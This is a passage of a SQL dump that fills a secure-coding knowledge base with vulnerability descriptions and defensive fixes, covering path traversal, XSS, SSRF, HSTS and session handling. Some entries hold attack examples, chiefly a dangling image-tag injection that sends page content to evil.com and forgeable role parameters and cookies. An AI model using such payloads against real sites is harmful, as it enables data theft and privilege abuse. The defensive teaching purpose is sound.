using it in your application. It is common that complete unittest are created especially
for this purpose.
', 'All error handling logic must fail securely'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('145',' Description:

Always enforce multiple layers of security whenever you want to protect sensitive data/files
on your application. If one layer should fail the other layers should prevent the attackers
from succeeding.

 Solution:

Whenever sensitive data is stored on the server store the data in a separate folder with permission rules in order to prevent unauthorized users from reading the files. As an indepth solution, you could also check if the session of the user has sufficient privileges to read the files according to the level of authorization.
Recommended knowledge base item:
•	Missing authentication or authorization
•	Sanitize sensitive data rapidly from memory

', 'User restriction for sensitive data'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('64',' Description:

Whenever certain security settings in your application frameworks
(e.g., Struts, Spring, ASP.NET) and libraries are not set to secure values, this could lead
to vulnerabilities in your application which an attacker could exploit.

 Solution:

Make sure all your security settings in your development framework are set to secure values.
This can be checked by using hardening guides.
', 'Security settings in your development frameworks'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('78',' Description:

Whenever there are user credentials supplied in an audit log,
this could become a risk whenever an attacker could gain access to one of these log files.

 Solution:

Instead of storing user credentials, you may want to use user ID''s in order to
identify the user in the log files.

', 'User credentials in audit logs'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('44',' Description:

An application uses parameters in order to process data.
These parameters can also be used to assign certain roles and retrieve
Content corresponding with those parameters.
For example:

    www.target.com/index.php?loggedin=user

In this situation the application will get content and subscribe user roles corresponding to the user parameter.

    www.target.com/index.php?loggedin=admin

In this situation the application will get content and subscribe user roles corresponding to the admin parameter.
(Note: the above two links are no longer available.)

 Solution:

Whenever you are checking whether a user is restricted to review certain data, the access
restrictions should be processed serverside.

The userID should be stored inside of a session variable on login and should be used to
retrieve user data from the database like : SELECT data from personaldata where userID=:id < session var

Now a possible attacker cannot tamper and change the application operation since the
identifier for retrieving the data is handled serverside.
', 'Identifier based authorization'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('106',' Description:

A sandbox is a security mechanism for separating running programs.
It is often used to execute untested code, or untrusted programs from
unverified third parties, suppliers, untrusted users and untrusted websites. It''s creating
an extra layer of security where an attacker first needs to break out from.

 Solution:

Examples of sandbox implementations include the following:
A jail: networkaccess restrictions, and a restricted file system namespace. Jails are most commonly used in virtual hosting.
Rulebased execution gives users full control over what processes are started, spawned (by other applications), or allowed to inject code into other applications and have access to the net, by having the system assign access levels to users or programs according to a set of determined rules. It also can control file/registry security (what programs can read and write to the file system/registry). In such an environment, viruses and Trojans have fewer opportunities of infecting a computer. The SELinux and AppArmor security frameworks are two such implementations for Linux.
Virtual machines emulate a complete host computer, on which a conventional operating system may boot and run as on actual hardware. The guest operating system runs sandboxed in the sense that it does not function natively on the host and can only access host resources through the emulator.
Sandboxing on native hosts: Security researchers rely heavily on sandboxing technologies to analyze malware behavior  By creating an environment that mimics or replicates the targeted desktops, researchers can evaluate how malware infects and compromises a target host. Numerous malware analysis services are based on the sandboxing technology.
Capability systems can be thought of as a finegrained sandboxing mechanism, in which programs are given opaque tokens when spawned and have the ability to do specific things based on what tokens they hold. Capabilitybased implementations can work at various levels, from kernel to userspace. An example of capabilitybased userlevel sandboxing involves HTML rendering in a Web browser.
Secure Computing Mode (seccomp) is a sandbox built in the Linux kernel. When activated, seccomp only allows the write(), read(), exit(), and sigreturn() system calls.
HTML5 has a "sandbox" attribute for use with iframes.
Java virtual machines include a sandbox to restrict the actions of untrusted code, such as a Java applet.
The .NET Common Language Runtime provides Code Access Security to enforce restrictions on a untrusted code.

```
', 'Sandboxing'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('62',' Description:

Whenever there are unnecessary features enabled or installed this could increase
the attack surface of an attacker which could lead to serious danger such as XXE/CMD/XSS injections.

 Solution:

Make sure all features and software available on the application/server are necessary for
application to work proper. If not, uninstall or disable these services.
', 'Unnecessary features enabled or installed'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('180',' Description:

WYSIWYG editors can be a great risk to your web application since it allows direct
HTML as input to make the user perform styling on their submissions. This is why the
editor should be put under a strict sanitation protocol to prevent injections.

The first thing to take into consideration whenever you want to use WYSIWYG editors on
your web application is to use as limited options as possible. Only the options which
are necessary for your applications intended operation should be applied. This decreases
the attackers attack vector drastically and leaves less room for error in your WYSIWYG
editor in terms of your HTML sanitation.

When providing your web application with an WYSIWYG editor you should also take note that
most people just want to use bullets, make text bold or underline some text. They mostly
do not understand half the functionalities the editors are providing.

 Solution:

Download a HTML sanitizer and configure it to your specific needs. When configuring the sanitizer make sure
you disable all unused components. The less options an attacker has to insert into your application the less
his attack surface becomes. Also before implementing this HTML sanitizer on a production environment have
it first thoroughly examined by security testers since it is a very delicate function.
', 'WYSIWYG editors'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('170',' Description:

In cryptography, forward secrecy (FS; also known as perfect forward secrecy, or PFS) is a property of keyagreement protocols ensuring that a session key derived from a set of longterm keys cannot be compromised if one of the longterm keys is compromised in the future. The key used to protect the transmission of data must not be used to derive any additional keys, and if the key used to protect the transmission of data is derived from some other keying material, then that material must not be used to derive any more keys. In this way, compromise of a single key permits access only to data protected by that single key.

 Solution:

In the beginning SSL handshake, the client sends a list of supported cipher suites (among other things). The server then picks one of the cipher suites, based on a ranking, and tells the client which one they will be using.

This step is the one that determines whether or not the future connection will have perfect forward secrecy. Note that, at this point, certificates have not entered the picture at all. This is because whether or not a connection has perfect forward secrecy is determined by how the session key is derived. And how the session key is derived is determined by the cipher suite in use. So, the cipher suites that use ephemeral DiffieHellman (DHE) or the elliptic curve variant (ECDHE) will have perfect forward secrecy while the other options will not.
', 'Forward secrecy ciphers'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('36',' Description:

If the application uses regular expressions which receive user input,
then the user input should be properly escaped.
If not done properly, then the hacker can affect the regular expression and modify their
logic. In some cases, an attacker could even gain access to the server.


 Solution:

Do not use userinput without escaping in a regular expression "regex pattern",
Since this could lead to serious security vulnerabilities.
', 'Regular expression injection'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('10',' Description:

Processing of an external entity containing tainted data may lead to the disclosure of confidential information and other system impacts. The XML 1.0 standard defines the structure of an XML document. The standard defines a concept called an entity, which is a storage unit of some type. There exists a specific type of entity, an external general parsed entity often shortened to an external entity that can access local or remote content via a declared system identifier. The system identifier is assumed to be a URI that can be dereferenced (accessed) by the XML processor when processing the entity.
The XML processor then replaces occurrences of the named external entity with the contents dereferenced by the system identifier. If the system identifier contains tainted data and the XML processor dereferences this tainted data, the XML processor may disclose confidential information normally not accessible by the application. Attacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.
Since the attack occurs relative to the application processing the XML document, an attacker may use this trusted application to pivot to other internal systems, possibly disclosing other internal content via HTTP(s) requests. In some situations, an XML processor library that is vulnerable to clientside memory corruption issues may be exploited by dereferencing a malicious URI, possibly allowing arbitrary code execution under the application account. Other attacks can access local resources that may not stop returning data, possibly impacting application availability if too many threads or processes are not released.


 Solution:

Disable the XML DTD (Document Type Definition) parsing. This can be set when initiating the XML parser.
', 'External DTD parsing'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('124',' Description:

Whenever the application contains a single applicationlevel logging implementation it
becomes clear, transparent and easy to maintain. It also reduces the possibility that you
overlook high priority logging.

 Solution:

Verify that there is a single applicationlevel logging implementation that is used by
the software.
', 'Single application level logging'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('84',' Description:

Whenever the server your webapplication is connecting towards is not using any form of
explicit authentication and is internet facing, then this means the server
cannot be trusted. This is because the server can be potentially be owned and managed by
everybody including hackers.

 Solution:

Whenever the webapplication is facing the internet third parties trying to
access it should always use a form of authentication in order to gain access.
', 'Servers must not be trusted without explicit authentication'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('32',' Description:

An application which offers user login functionality, usually has an administration page
where userdata can be modified. When the user wants to change this data he should
specify his current password.

 Solution:

When changing user credentials or email address the user must always enter a valid
password in order to implement the changes. This is also called reauthentication or
stepup / adaptive authentication. Whenever a user "reauthenticates" himself the current
session ID value should also be refreshed in order to fend oFf so called "session hijackers"
', 'Unauthorized credential changes'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('60',' Description:

All sessions should implement an idle or inactivity timeout.
This timeout defines the amount of time a session will remain active in case there is no
activity in the session, closing and invalidating the session upon the defined idle period
since the last HTTP request received by the web application for a given session ID.
The idle timeout limits the chances an attacker has to guess and use a valid session ID
from another user. However, if the attacker is able to hijack a given session,
the idle timeout does not limit the attacker''s actions, as he can generate activity on
the session periodically to keep the session active for longer periods of time.

Session timeout management and expiration must be enforced on the serverside. If the client is
used to enforce the session timeout, for example using the session token or other client
parameters to track time references (e.g. number of minutes since login time), an attacker
could manipulate these to extend the session duration.

 Solution:

All user sessions should timeout based on logic serverside in order to decrease an
attackers attack vector on the user session.
', 'Session IDs do not timeout (idl)'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('165',' Description:

Whenever an attacker sends a request to the server, an example by means of
authentication functionality. He can measure the average response time between a request
containing a valid username and a request containing a invalid username. The
attacker can now use this differential in response time to enumerate user accounts.

 Solution:

Verify that all authentication challenges, whether successful or failed, should respond
in the same average response time. This same methodology applies for other sensitive information that could
potentially be recovered with differential attacks.
', 'Differential analysis attack'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('107',' Description:

A repudiation attack happens when an application or system does not adopt controls to
properly track and log users actions, thus permitting malicious manipulation or forging
the identification of new actions. This attack can be used to change the authoring
information of actions executed by a malicious user in order to log wrong data to log files.
Its usage can be extended to general data manipulation in the name of others,
in a similar manner as spoofing mail messages. If this attack takes place, the data stored
in log files can be considered invalid or misleading.

 Solution:

This type of data should always be processed out of reach of the user and should be
verified and enforced serverside.
', 'Repudiation attack'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('27',' Description:

An application can implement all kinds of logic rules through JavaScript and HTML.
However, these are clientside constraints that a hacker can easily disable or modify.

 Solution:

User restrictions should always be imposed by serverside techniques instead
of clientside constraints.
', 'Client side state management'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('220',' Description:

Whenever sensitive information in stored in the devices’ memory, this information can 
be dumped by various tool such as “android debugger (ADB)“ on android devices. This 
information could give critical information about the application and could aid attackers 
in their attacks.

 Solution:

Sensitive information maintained in memory must be overwritten with zeros as soon as it 
no longer actively used, to mitigate memory dumping attacks.

Note: 
Whenever the programming language has a garbage collector make sure whenever values are zeroed the GC is also
emptied.
', 'Mitigate memory dumping attacks'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('12',' Description:

Web servers usually give developers the ability to add small pieces of dynamic code inside
static HTML pages, without having to deal with fullfledged serverside
or clientside languages.

This feature is incarnated by the ServerSide Includes (SSI).
The attacker will try to inject code into the application that will
be interpreted by SSI mechanisms. A successful exploitation of this vulnerability
allows an attacker to inject code into HTML pages or even perform remote code execution.

 Solution:

The SSI handler on the webserver should not be activated when it is not used.
', 'SSI injections'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('207',' Description:

There should be extra care taken into account when you are dealing with PII(personal identifiable information) in your
application. There are multiple laws in countries that demand proper protection by
means of SSL/TLS for when the data is in transit and encrypted with pub priv key system
when stored on the disk. This is needed to protect the user from identity theft and fraud.

 Solution:

Personally Identifiable Information needs to be stored encrypted at rest and ensure that all
communication goes via protected channels like SSL/TLS.
', 'PII protection'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('192',' Description:

HTTP Strict Transport Security (HSTS) is an optin security enhancement that is specified
by a web application through the use of a special response header. Once a supported browser
receives this header that browser will prevent any communications from being sent over
HTTP to the specified domain and will instead send all communications over HTTPS. It also
prevents HTTPS click through prompts on browsers. 

HSTS addresses the following threats:

1. User bookmarks or manually types http://example.com and is subject to a maninthemiddle attacker
   HSTS automatically redirects HTTP requests to HTTPS for the target domain
2. Web application that is intended to be purely HTTPS inadvertently contains HTTP links or serves content over HTTP
   HSTS automatically redirects HTTP requests to HTTPS for the target domain
3. A maninthemiddle attacker attempts to intercept traffic from a victim user using an invalid certificate and 
   hopes the user will accept the bad certificate
4. HSTS does not allow a user to override the invalid certificate message

 Solution:

When users are visiting the application it should set the following header:
These headers should be set in a base class which always sets the header no mather what
page the users initially visit.

Simple example, using a long (1 year) maxage:
    StrictTransportSecurity: maxage=31536000

If all present and future subdomains will be HTTPS:
    StrictTransportSecurity: maxage=31536000; includeSubDomains

 CAUTION: 
Site owners can use HSTS to identify users without cookies. This can lead to a significant
privacy leak.

Cookies can be manipulated from subdomains, so omitting the include "includeSubDomains"
option permits a broad range of cookierelated attacks that HSTS would otherwise prevent
by requiring a valid certificate for a subdomain. Ensuring the "Secure Flag" is set on all
cookies will also prevent, some, but not all, of the same attacks.

', 'HTTP strict transport security'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('46',' Description:

All SQL queries, HQL, OSQL, NOSQL and stored procedures, related to stored procedures should be
protected by the use of query parameterization.
If an attacker can inject malicious code into these queries and gain the ability to
manipulate them and can withdraw, update and delete data which is stored on the
target database.

 Solution:

The use of prepared statements and parameterized queries is how all developers should
first be taught how to write database queries. They are simple to write, and easier to
understand than dynamic queries. Parameterized queries force the developer to first define
all the SQL code, and then pass in each parameter to the query later. This coding style
allows the database to distinguish between code and data, regardless of what user input
is supplied.
', 'Prepared statements and query parameterization'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('33',' Description:

Double decoding is a problem which often occurs when multiple servers are used in which a
configuration error is made.
A hacker can encode his payload differently so it will not be recognized by a Web Application Firewall (WAF) or an Intrusion Detection System (IDS) and also bypass the escaping of the application.

By using double encoding it''s possible to bypass security filters that only decode user
input once. The second decoding process is executed by the backend platform or modules
that properly handle encoded data, but don''t have the corresponding security checks in
place.

Attackers can inject double encoding in pathnames or query strings to bypass the
authentication scheme and security filters in use by the web application.

 Solution:

Only one webserver should decode/encode the data.
', 'Double decoding of headers parameters'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('223',' Description:

Whenever application assets such as JavaScript libraries or CSS styleshees are not hosted
on the application itself but on a external CDN which is not under your control these
CDNs'' can introduce security vulnerabilities. Whenever one of these CDN gets compromised
attackers can include malicious scripts. Also whenever one of these CDNs'' get out of service
it could affect the operation of the application and even cause a denial of service.

 Solution:

Verify that all application assets are hosted by the application, such as JavaScript libraries, CSS
stylesheets and web fonts are hosted by the application rather than rely on a CDN or external
provider. 
', 'Application assets hosted on secure location'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('45',' Description:

Throughout development of the application, there must be perpetual checks in place to check
if all pages and resources by default require authentication except those specifically intended to be public.

Sometimes developers simply forget to implement these checks, or they remove the checks 
temporarily for testing purposes. 

 Solution:

Verify all access controls are implemented properly in order to prevent a user access data/functions which 
he was not intended to use.
', 'Principle of complete mediation'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('121',' Description:

When there is no policy for managing your cryptographic keys, expired or revoked keys
that could unknowingly be used again thus becoming a threat for your encrypted data.

 Solution:

Verify that there is an explicit policy for how cryptographic keys are managed
(e.g., generated, distributed, revoked, expired). Verify that this policy is properly
enforced.
', 'Policy for managing cryptographic keys'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('83',' Description:

If the audit log does not contain a clear priority system, it will be difficult to
prioritize different types of process failures.

 Solution:

Whenever the webapplication is writing error messages to the error log, then these need
to have a correct priority label. The labels that you can use are LOW, MEDIUM and HIGH.
These labels can then be used at a later moment in time for easy and quick analysing
capabilities of the log files.

You should also verify security logging controls, provide the ability to log success and
particularly failure events that are identified as securityrelevant.
', 'The audit log must include a priority system'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('187',' Administrative interfaces are not accessible to untrusted parties


 Description:

Whenever it is not necessary for administrative pages to be publicly accessible these
pages should have restricted access for users. Whenever these pages are secluded from the rest
of the application in terms of accessibility this could reduce the attack vector of malicious users.

 Solution:

The first solution is to grant access only from a certain source IP range to the
administrative interface. If that solution would not be possible then it is always recommended
to enforce a stepup or adaptive authentication for logging in into the administrative interface.

Recommended knowledgebase item:

 Step up or adaptive authentication
', 'administrative interfaces must not be accessible to untrusted parties'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('202',' Description:

Verify that unstructured data is sanitized to enforce generic safety measures. When this is not
setup an attacker can use this unstructured data to harm the application and perform injections.

 Solution:

Unstructured data needs to be sanitized to enforce generic safety measures for example:

 allowed characters
 character length,

Also some characters are potentially harmful in given context and thus should be escaped.
(e.g. natural names with Unicode or apostrophes, such as &x306D;&x3053; or O''Hara)
', 'Sanitize unstructured data'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('244',' Description:

Whenever sensitive information is being sent over the application TLS must be applied in the application
to prevent malicious attackers eavesdropping the network can look into and manipulate this
sensitive information.


 Solution:

Verify that TLS is used for all connections (including both external and backend connections) 
that are authenticated or that involve sensitive data or functions, and does not fall back to
insecure or unencrypted protocols. Ensure the strongest alternative is the preferred algorithm.

As modern cryptography relies on being computationally expensive to break, specific standards can be set for
key sizes that will provide assurance that with today’s technology and understanding, it will take too long
to decrypt a message by attempting all possible keys.

Therefore, we need to ensure that both the algorithm and the key size are taken into account when selecting
an algorithm. Whenever computer power increases the standards for selecting a new alogrithm changes as well.
', 'TLS implementation'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('243',' Description:

After completing a password recovery functionality, the user should not be sent a plaintext
password to his email adress. The application should also under no circumstances disclose the old or current password
to the users.

 Solution:

The application should under no circumstances disclose the users current, old and new password plain text.
This behavior makes the application susceptible to side channel attacks and make the passwords
lose their integrity since they could be compromised by someone looking over another users shoulder to
see the password. 
', 'Password leakage'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('77',' Description:

An audit trail (also called audit log) is a securityrelevant chronological record,
set of records, and/or destination and source of records that provide documentary
evidence of the sequence of activities that have affected at any time a specific operation,
procedure, or event.

 Solution:

An audit log should contain the following items:

 User ID
 Operation
 Success/failure of the operation
 Privileges
 Timestamp

Depending on the gravity of the users violation, there should also be a record kept for
each user to lock their accounts after a certain number of violations. This should be
applied since we can now assume it is an attacker trying to compromise your application.

Also when doing audit logs, make sure you always do logging before taking action in case the
action is not properly processed or terminated by your application. When using this
approach you are always in possession of an complete audit trail.
', 'Audit logs'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('262',' Description:

Server Side Request Forgery (SSRF) attack, where an attacker abuse the functionality of a
vulnerable web application to send crafter request which which read or update internal 
resources. Attacker can attack an internal network or application behind the firewall with
this attack which is normally not accessible through external network and even attack the
internal network web applications.

SSRF attack can be used to make requests to other internal resources for accessing the 
metadata and to run a port can on the internal network. URL schema such as file:// can
be used to read the file from the server. Attackers can use legacy URL schemas such as 
dict, gopher, expect etc which can even cause remote code execution.

 Solution:

Disable unused URL schemas which are dangerous like expect://, file:///, ftp://, gopher://.
Proper whitelisting of domain or IP address which you need to access to. Response received from 
the internal server should not be shown to the attacker. Some services like Memcached, Redis, Elasticsearch and MongoDB do not require authentication by default, so we need to enable 
authentication for these services.
', 'Server side request forgery'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('123',' Description:

Whenever error handling is not applied through trusted devices the errors it supplies can
not be trusted since they can be tampered with.

 Solution:

Verify that all error handling is performed on trusted devices.
', 'Error handling on trusted devices'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('91',' Description:

If the session id is disclosed in the URL the users session ID can be easily obtained by
an attacker and could leak through the referrer header towards other severs. Also whenever
the session ID is disclosed in the URL the possibility also arises to perform other
attacks like session fixation which could lead to session hijacking.

 Solution:

Session ID should never be included in places other than the application cookie header.
', 'Verify that the session id is never disclosed'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('158',' Description:

A quick overview of how it works:

1. A website www.example.com hands out subdomains to untrusted third parties
2. One such party, Mallory, who now controls evil.example.com, lures Alice to her site
3. A visit to evil.example.com sets a session cookie with the domain .example.com on Alice''s browser
4. When Alice visits www.example.com, this cookie will be sent with the request, as the specs for cookies states, and Alice will have the session specified by Mallory''s cookie.
5. Mallory can now use Alice her account.

 Solution:

In this scenario changing the sessionID on login does not make any difference since
Alice is already logged in when she visits Mallory''s evil web page.

It is good practice to use a completely different domain for all trusted activity.

For example Google uses google.com for trusted activities and *.googleusercontent.com
for untrusted sites.

Also when setting your cookies to specify which domains they are allowed to
be send to. Especially on your trusted domain you do not want to leak cookies to unintended
subdomains. highly recommended is to not use wildcards when setting this option.
', 'cross subdomain cookie attack'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('232',' Description:

Access control decisions must be logged for forensics in the case of brute force attacks. 
The logs of the access controls can also help with keeping track of potential session hijacking
attacks. Since it can be measured where users logged in from and how many concurrent sessions are active.

 Solution:

Verify that all access control decisions can be logged and all failed decisions are logged.
', 'Logging access control decisions'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('1',' Description:

A Path Traversal attack aims to access files and directories that are stored outside the web root folder. By browsing the application, the attacker looks for absolute links to files stored on the web server. By manipulating variables that reference files with dotdotslash (../); sequences and its variations, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and critical system files, limited by system operational access control. The attacker uses  ../../ sequences to move up to root directory, thus permitting navigation through the file system. This attack can be executed with an external malicious code injected on the path, like the Resource Injection attack.


 Solution:

The most effective solution to eliminate file inclusion vulnerabilities is to avoid passing
usersubmitted input to any filesystem/framework API. If this is not possible the application
can maintain a white list of files, that may be included on the page, and then use an identifier
(for example the index number) to access the selected file. Any request containing an invalid
identifier has to be rejected, in this way there is no attack surface for malicious users to
manipulate the path.

', 'Filename injection Path traversel'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('252',' Description:

Components are defined in terms of the business functions and/or security functions they provide.
It is easier for forensics to do their investigations whenever a breach has happened on an application.

These insights also help whenever an update or release is made on the application to determine what security
risks are effectively covered by the security functions. 

 Solution:

Verify that all application components are defined in terms of the business functions
and/or security functions they provide.
', 'Identify all components'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('241',' Description:

Whenever granting users different types of authorization throughout the application
the authorization grants should be granted and enforced outside of the attackers scope.

i.e whenever a user gets his authorization grants through a cookie that says,

````
    auth=admin or auth=user
````

These authorization grants are easily manipulable.


 Solution:

Authorization grants must be granted and enforced outside of the attackers scope. 

i.e: 
The user logs into the application, the user id is then stored in a local variable.
The application stores grants(privileges/attributes/claims) in the database and for each
function the user calls the application gets the grants from the DB using the local variable
and checks if the user has access to this function.
', 'Context sensitive authorization'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('221',' Description:

Whenever input from exported activities intents or content provided is not properly validated
this input could potentially exploit vulnerabilities on the mobile application depending on
the context in where the input is being used.

 Solution:

Input from exported activities, intents or content providers should be validated against 
the applications intended operation, i.e if the application expects a field with an integer value,
all other incoming data that work out of this intended operation should be logged and rejected
by the application.
', 'Protect agains exported activities or content providers'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('173',' Description:

The File Inclusion vulnerability allows an attacker to include a file, usually exploiting
a "dynamic file inclusion" mechanisms implemented in the target application.
The vulnerability occurs due to the use of usersupplied input without proper validation.


This can lead to something as outputting the contents of the file, but depending on the
severity, it can also lead to:

 Code execution on the web server
 Code execution on the clientside such as JavaScript which can lead to other attacks
  such as crosssite scripting (XSS)
 Denial of Service (DoS)
 Sensitive Information Disclosure


Local File Inclusion (also known as LFI) is the process of including files, that are
already locally present on the server, through the exploiting of vulnerable inclusion
procedures implemented in the application. This vulnerability occurs, for example, when a
page receives, as input, the path to the file that has to be included and this input is
not properly sanitized, allowing directory traversal characters (such as dotdotslash)
to be injected. Although most examples point to vulnerable PHP scripts, we should keep
in mind that it is also common in other technologies such as JSP, ASP and others.

 Solution:

The most effective solution to eliminate file inclusion vulnerabilities is to avoid passing usersubmitted input to any filesystem/framework API. If this is not possible the application can maintain a white list of files, that may be included on the page, and then use an identifier (for example the index number) to access the selected file. Any request containing an invalid identifier has to be rejected, in this way, there is no attack surface for malicious users to manipulate the path.

Also, disable the opportunity for the application to load remote resources. This is mostly achieved by adding a server configuration file such as php.ini or web.xml


', 'File inclusion attack'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('205',' Description:

There are some techniques attackers use to decrease the entropy pool of the system so it will
create weak and predictable ''random'' numbers that should not be used in crypto functions.

 Solution:

Enforce in your application that random numbers are created with proper entropy even when the
application is under heavy load, or that the application degrades gracefully in such circumstances.
', 'Enforce random numbers are created with proper entropy at runtime'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('3',' Description:

Every time the application gets userinput, whether this showing it on screen or processing
this data in the application background, these parameters should be escaped for malicious
code in order to prevent crosssite scripting injections.
When an attacker gains the possibility to perform an XSS injection,
he is given the opportunity to inject HTML and JavaScript code directly into the
application. This could lead to accounts being compromised by stealing session cookies or directly affect the operation of the target application.

 Solution:

In order to prevent XSS injections, all userinput should be escaped or encoded.
You could start by sanitizing userinput as soon as it is inserted into the application,
by preference using a so called whitelisting method.
This means you should not check for malicious content like the tags or anything,
but only allow the expected input. Every input which is outside of the intended operation
of the application should immediately be detected and login rejected.
Do not try to help use the input in any way because that could introduce a new type of attack by converting characters. 

The second step would be encoding all the parameters or userinput before putting this in
your html with encoding libraries specially designed for this purpose.

You should take into consideration that there are several contexts for encoding userinput for
escaping XSS injections. These contexts are amongst others:

HTML encoding is for whenever your userinput is displayed directly into your HTML.
HTML attribute encoding is the type of encoding/escaping that should be applied whenever your user input is displayed into the attribute of your HTML tags.
HTML URL encoding ;This type of encoding/escaping should be applied to whenever you are using userinput into a HREF tag.

JavaScript encoding should be used whenever parameters are rendered via JavaScript; your application will detect normal injections in the first instant. But your application still remains vulnerable to JavaScript encoding which will not be detected by the normal encoding/escaping methods.

', 'xss injection'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('255',' Description:

HTTP Strict Transport Security (HSTS) is an optin security enhancement that is specified by a 
web application through the use of a special response header. Once a supported browser receives 
this header that browser will prevent any communications from being sent over HTTP to the specified 
domain and will instead send all communications over HTTPS. It also prevents HTTPS click through prompts on browsers.

However, there is still a window where a user who has a fresh install, or who wipes out their local state,
is vulnerable. This is due to the fact that the browser is not yet aware of the fact if the application is trying to connect to supports HSTS. Whenever you are added to the preload list,
the application its preference is hardcoded into the browser and all first initial connections will
always be made by HTTPS.

 Solution:

In order to request for HSTS preloading, there are some requirements the application has to 
be complient with. The submission for the HSTS preloading can be performed on the following url:

    https://hstspreload.org/

Submission Requirements

If a site sends the preload directive in an HSTS header, it is considered to be requesting 
inclusion in the preload list and may be submitted via the form on this site.

In order to be accepted to the HSTS preload list the site must satisfy the following set of requirements:

1. Serve a valid certificate.
2. Redirect from HTTP to HTTPS on the same host, if you are listening on port 80.
3. Serve all subdomains over HTTPS.
    In particular, you must support HTTPS for the www subdomain if a DNS record for that subdomain exists.
5. Serve an HSTS header on the base domain for HTTPS requests:
    The maxage must be at least eighteen weeks (10886400 seconds).
    The includeSubDomains directive must be specified.
    The preload directive must be specified.
    If you are serving an additional redirect from your HTTPS site, that redirect must still have the HSTS
     header (rather than the page it redirects to).

Now the following parameter can be added to the HSTS header,

maintained by Chrome (and used by Firefox and Safari), then use:
    StrictTransportSecurity: maxage=31536000; includeSubDomains; preload

The ''preload'' flag indicates the site owner''s consent to have their domain preloaded. The site owner
still needs to then go and submit the domain to the list.

 CAUTION:

Make sure to have a perfectly smooth certification management. Whenever there is no
valid certificate, the application can not be downgraded temporarily over HTTP. The failing of
the TLS certificate will lead to a DOS since HSTS does not allow the application to be visited over HTTP
', 'HSTS preload'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('94',' Description:

Whenever the application detects malicious or unexpected userinput, you want to make sure
the application actual rejects the submitted userinput rather than directly process it.

 Solution:

Verify that the application actually rejects the user requests whenever malicious input
is detected by your application. The base of this process will be checking the application
for expected userinput, for example: Whenever the user is filling in a form which
contains a checkbox, there are fixed values which your application can expect from
the user to return. Whenever this value differs from what the application served the user
as possible answers, you can assume the request was corrupted and you reject the request.

You must also keep track of the users movements by adding an audit trail as well as a
counter for tracking the number of his violations(submitting bad input) in your input
validation class. You should enforce a lockout whenever a unreasonable number of
violations are detected by your application in order to protect it from attackers.

', 'Input rejection'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('159',' Description:

Whenever an attacker can inject HTML in your application there is a variety of different
attacks he could perform such as:

1. Content Spoofing
2. Image Tag Injection 	
3. Form Rerouting
4. Base Jumping
5. Element Override
6. Hanging Textarea

Even when your application intercepts XSS injections by means of a content security policy
header it still remains vulnerable to the attacks summarized above.

 Solution:

1.Content spoofing Otherwise known as "Content Injection" or "Virtual Defacement" occurs whenever an attacker can inject code into your application. It is very important to sanitize and or encode user data before you display it on screen as HTML.

2.Image tag injection occurs whenever an attacker injects a broken image tag with a nonterminated parameter like: "img src=''http://evil.com?steal.php?value= Every content after value= parameter will now be stolen and send to evil.com by the attacker till the injection finds the next occurrence of a matching single quote.
Again you should sanitize and encode the user input to prevent an image tag from being injected in your application. For whenever a user is permitted to submit an image on your application enforce and verify the application accepts valid nonbroken tags only.

3.The "form" tag can''t be nested. The toplevel occurrence of this element always takes precedence over subsequent appearances. Again you must avoid this type by properly encoding and sanitizing your userinputs.

4.Whenever an attacker injects a "base" tag into your application it can steal data because the tag specifies the base URL/target to where to process the data to.
